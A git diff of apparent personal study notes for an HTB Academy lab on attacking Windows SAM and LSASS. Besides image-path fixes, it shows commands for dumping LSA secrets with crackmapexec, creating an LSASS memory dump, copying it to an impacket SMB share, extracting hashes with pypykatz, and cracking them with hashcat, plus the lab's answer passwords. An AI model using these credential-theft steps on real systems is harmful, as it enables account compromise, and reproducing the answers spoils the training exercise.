@@ -1,4 +1,4 @@
-# 🪅 Windows Local Password Attacks
+# Attacking SAM & LSASS
 
 ## Attacking SAM
 
@@ -64,13 +64,13 @@ ElFelixi0@htb[/htb]$ crackmapexec smb 10.129.42.198 --local-auth -u bob -p HTB_@
 
 _**Apply the concepts taught in this section to obtain the password to the ITbackdoor user account on the target. Submit the clear-text password as the answer.**_
 
-<figure><img src="../../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
 
 ```
 hashcat -m 1000 realnthash.txt /usr/share/wordlists/rockyou.txt.gz
 ```
 
-<figure><img src="../../../.gitbook/assets/image (1).png" alt=""><figcaption><p>c02478537b9727d391bc80011c2e2321:matrix</p></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/image (1).png" alt=""><figcaption><p>c02478537b9727d391bc80011c2e2321:matrix</p></figcaption></figure>
 
 _**Dump the LSA secrets on the target and discover the credentials stored. Submit the username and password as the answer.**_
 
@@ -78,13 +78,13 @@ _**Dump the LSA secrets on the target and discover the credentials stored. Submi
 crackmapexec smb 10.129.202.137 --local-auth -u Bob -p HTB_@cademy_stdnt! --lsa
 ```
 
-<figure><img src="../../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
 
 ## Attacking LSASS
 
 LSASS is a critical service that plays a central role in credential management and the authentication processes in all Windows operating systems.
 
-<figure><img src="../../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
 
 LSASS will:
 
@@ -95,7 +95,7 @@ LSASS will:
 
 With access to an interactive graphical session with the target, we can use task manager to create a memory dump.
 
-<figure><img src="../../../.gitbook/assets/image (4).png" alt=""><figcaption><p><code>Open Task Manager</code> > <code>Select the Processes tab</code> > <code>Find &#x26; right click the Local Security Authority Process</code> > <code>Select Create dump file</code></p></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/image (4).png" alt=""><figcaption><p><code>Open Task Manager</code> > <code>Select the Processes tab</code> > <code>Find &#x26; right click the Local Security Authority Process</code> > <code>Select Create dump file</code></p></figcaption></figure>
 
 And a file will be created here ->
 
@@ -192,4 +192,22 @@ ElFelixi0@htb[/htb]$ sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/
 
 _**Apply the concepts taught in this section to obtain the password to the Vendor user account on the target. Submit the clear-text password as the answer.**_
 
-<figure><img src="../../../.gitbook/assets/image (1455).png" alt=""><figcaption><p>C:\Users\HTB-ST~1\AppData\Local\Temp\lsass.DMP</p></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/image (1455).png" alt=""><figcaption><p>C:\Users\HTB-ST~1\AppData\Local\Temp\lsass.DMP</p></figcaption></figure>
+
+```
+python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/htb-ac-1032889/Documents/
+```
+
+<figure><img src="../../../../.gitbook/assets/image (1456).png" alt=""><figcaption></figcaption></figure>
+
+```
+pypykatz lsa minidump lsass.DMP
+```
+
+<figure><img src="../../../../.gitbook/assets/image (1457).png" alt=""><figcaption><p>31f87811133bc6aaa75a536e77f64314</p></figcaption></figure>
+
+```
+hashcat -m 1000 31f87811133bc6aaa75a536e77f64314 /usr/share/wordlists/rockyou.txt.gz
+```
+
+<figure><img src="../../../../.gitbook/assets/image (1458).png" alt=""><figcaption><p>31f87811133bc6aaa75a536e77f64314:Mic@123</p></figcaption></figure>
